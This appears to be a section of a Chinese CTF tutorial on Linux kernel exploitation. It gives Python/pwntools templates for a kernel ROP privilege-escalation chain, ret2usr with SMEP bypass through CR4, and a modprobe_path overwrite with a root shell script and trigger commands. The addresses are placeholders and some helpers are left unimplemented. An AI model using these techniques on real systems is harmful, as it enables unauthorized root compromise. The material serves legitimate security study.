# 内核PWN基础

### 6.1 kernel ROP

```python
from pwn import *

context(arch='amd64', os='linux')

# 内核PWN环境通常提供:
# 1. 一个有漏洞的内核模块（.ko文件）
# 2. 一个bzImage（内核镜像）
# 3. 一个文件系统镜像（cpio/gz）

# 分析内核模块
# 1. 提取模块: 从cpio中提取.ko文件
# 2. 使用IDA分析: 寻找漏洞（通常在ioctl/read/write中）
# 3. 确定保护: 检查内核编译选项

# 内核保护机制:
# - KASLR: 内核地址随机化
# - SMEP: 管理模式执行保护（不能在用户态执行内核代码）
# - SMAP: 管理模式访问保护（不能在用户态访问内核数据）
# - KPTI: 内核页表隔离

# kernel ROP利用步骤:

# 1. 保存用户态寄存器（用于返回用户态）
# 在用户态准备
user_cs = 0
user_ss = 0
user_rflags = 0
user_sp = 0
user_ip = 0

def save_state():
    """保存用户态状态"""
    global user_cs, user_ss, user_rflags, user_sp, user_ip
    # 通过汇编保存
    # ...省略实现

# 2. 提权
# commit_creds(prepare_kernel_cred(0))
# 需要知道这两个函数的地址

prepare_kernel_cred = 0xffffffff810XXXXX  # 泄露或固定地址
commit_creds = 0xffffffff810YYYYY

# 3. 构造ROP链
rop_chain = b''
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(0)                    # 参数: NULL
rop_chain += p64(prepare_kernel_cred) # 调用prepare_kernel_cred(0)
rop_chain += p64(mov_rdi_rax_jmp)     # 将返回值(rax)移到rdi
rop_chain += p64(commit_creds)        # 调用commit_creds(rax)

# 4. 返回用户态
rop_chain += p64(swapgs_pop_rbp)      # swapgs
rop_chain += p64(0)
rop_chain += p64(iretq)               # iretq
rop_chain += p64(user_ip)             # 返回到用户态函数
rop_chain += p64(user_cs)
rop_chain += p64(user_rflags)
rop_chain += p64(user_sp)
rop_chain += p64(user_ss)

# 5. 触发漏洞并执行ROP
# 通过内核模块漏洞覆盖返回地址
```

### 6.2 ret2usr

```python
# ret2usr: 在内核态执行用户态代码
# 前提: SMEP和SMAP未开启

# 利用步骤:
# 1. 在用户态编写提权代码
# 2. 利用内核漏洞将执行流劫持到用户态函数

# 用户态提权函数
"""
void escalate_privs() {
    // 直接在用户态调用内核函数
    // 因为没有SMEP/SMAP，内核可以执行用户态代码
    commit_creds(prepare_kernel_cred(0));
    // 返回用户态
    swapgs();
    iretq(
        user_ip,    // 返回地址
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    );
}
"""

# 如果SMEP开启，需要通过ROP关闭CR4中的SMEP位
# mov cr4, 0x6f0 (关闭SMEP)
# 然后再跳转到用户态代码
```

### 6.3 modprobe_path利用

```python
from pwn import *

# modprobe_path 利用原理:
# 当内核尝试执行未知格式的二进制文件时
# 会调用 modprobe_path 指定的程序来加载
# 默认值为 /sbin/modprobe
# 如果能将其修改为自定义脚本，就能以root权限执行命令

# 利用步骤:
# 1. 通过内核漏洞获得任意写原语
# 2. 读取modprobe_path地址
#    /proc/kallsyms 或 通过偏移计算
# 3. 覆写modprobe_path为 /tmp/x
# 4. 在/tmp/x写入恶意脚本（如复制flag）
# 5. 执行一个未知格式的二进制文件触发modprobe
# 6. modprobe_path指向的脚本以root权限执行

# 示例:
# 1. 写入脚本
"""
#!/bin/sh
cat /flag > /tmp/flagged
chmod 777 /tmp/flagged
"""
# 保存到 /tmp/x 并 chmod +x

# 2. 触发modprobe
"""
# 创建一个未知格式的文件
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy  # 触发内核调用modprobe_path
"""

# 3. 读取flag
# cat /tmp/flagged
```

---

---

